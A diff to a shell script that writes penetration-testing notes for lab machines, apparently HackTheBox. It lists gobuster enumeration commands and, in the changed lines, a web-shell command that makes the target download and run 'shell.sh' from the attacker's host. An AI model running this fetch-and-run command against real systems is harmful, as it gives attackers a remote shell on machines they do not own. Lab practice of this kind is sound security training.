@@ -69,8 +69,8 @@ echo '#gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/
 echo '#gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o buster/root_files.log' >> $HOME/notes
 echo '#gobuster vhosts -u http://$BOXNAME.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o buster/vhosts.log' >> $HOME/notes
 echo '#gobuster dns domain.com -o buster/dom.log' >> $HOME/notes
-echo 'don\t do this: curl http://$IP/cmd.php?cmd=curl http://$SELF/shell.sh|bash ... (unless in browser window) do: ' >> $HOME/notes
-echo 'curl http://$IP/cmd.php --data-urlencode \'cmd=curl http://$SELF/shell.sh|bash\'' >> $HOME/notes
+echo "don\'t do this: curl http://$IP/cmd.php?cmd=curl http://$SELF/shell.sh|bash ... (unless in browser window) do: " >> $HOME/notes
+echo "curl http://$IP/cmd.php --data-urlencode \'cmd=curl http://$SELF/shell.sh|bash\'" >> $HOME/notes
 # Try nikto
 echo "" >> $HOME/notes
 echo "# nikto" >> $HOME/notes
